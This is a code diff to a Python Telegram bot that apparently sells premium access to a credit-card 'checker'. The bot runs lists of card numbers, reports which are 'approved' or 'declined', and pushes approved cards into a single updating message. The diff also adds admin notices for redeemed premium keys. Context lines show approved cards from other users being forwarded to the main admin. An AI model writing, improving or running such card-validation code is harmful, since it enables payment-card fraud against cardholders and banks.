@@ -931,6 +931,30 @@ def redeem_key(msg):
     mark_key_as_used(user_key, msg.from_user.id)
     add_premium(msg.from_user.id, msg.from_user.first_name, key_data['validity_days'])
 
+    # Send detailed notification to admin
+    user_info = get_user_info(msg.from_user.id)
+    subscription_info = get_subscription_info(msg.from_user.id)
+    
+    notification = f"""
+╔═══════════════════════╗
+       🎟️ PREMIUM REDEEMED 🎟️
+╚═══════════════════════╝
+
+👤 User: {user_info['full_name']}
+🆔 ID: <code>{msg.from_user.id}</code>
+📱 Username: {user_info['username']}
+🎫 Type: {user_info['user_type']}
+
+🗓️ Validity: {key_data['validity_days']} days
+🔑 Key: <code>{user_key}</code>
+📅 Expiry: {subscription_info[1]}
+
+⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+
+⚡ Powered by @mhitzxg
+"""
+
+    notify_admin(notification)
     bot.reply_to(msg, f"✅ Key redeemed successfully!\n🎟️ Subscription valid for {key_data['validity_days']} days.")
 
 # ---------------- Register Command ---------------- #
@@ -1533,9 +1557,11 @@ Valid format:
 
     approved, declined, checked = 0, 0, 0
     approved_cards = []  # To store all approved cards
+    approved_message_id = None  # To track the single approved cards message
 
     def process_all():
-        nonlocal approved, declined, checked, approved_cards
+        nonlocal approved, declined, checked, approved_cards, approved_message_id
+        
         for cc in cc_lines:
             try:
                 checked += 1
@@ -1556,17 +1582,40 @@ Valid format:
                     
                     approved_cards.append(formatted_result)  # Store approved card
                     
-                    # Send approved card immediately
-                    approved_message = f"""
+                    # Create or update the single approved cards message
+                    if approved_message_id is None:
+                        # First approved card - create the message
+                        approved_header = f"""
 ╔═══════════════════════╗
-       ✅ APPROVED CARD FOUND ✅
+       ✅ APPROVED CARDS FOUND ✅
 ╚═══════════════════════╝
 
-{formatted_result}
+"""
+                        approved_message = approved_header + formatted_result + f"""
 
 • Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
 """
-                    bot.send_message(chat_id, approved_message, parse_mode='HTML')
+                        sent_msg = bot.send_message(chat_id, approved_message, parse_mode='HTML')
+                        approved_message_id = sent_msg.message_id
+                    else:
+                        # Update existing message with new approved card
+                        approved_header = f"""
+╔═══════════════════════╗
+       ✅ APPROVED CARDS FOUND ✅
+╚═══════════════════════╝
+
+"""
+                        all_approved_cards = "\n\n".join(approved_cards)
+                        approved_message = approved_header + all_approved_cards + f"""
+
+• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
+"""
+                        try:
+                            bot.edit_message_text(approved_message, chat_id, approved_message_id, parse_mode='HTML')
+                        except:
+                            # If message editing fails, send a new one
+                            sent_msg = bot.send_message(chat_id, approved_message, parse_mode='HTML')
+                            approved_message_id = sent_msg.message_id
                     
                     if MAIN_ADMIN_ID != user_id:
                         bot.send_message(MAIN_ADMIN_ID, f"✅ Approved by {user_id}:\n{formatted_result}", parse_mode='HTML')
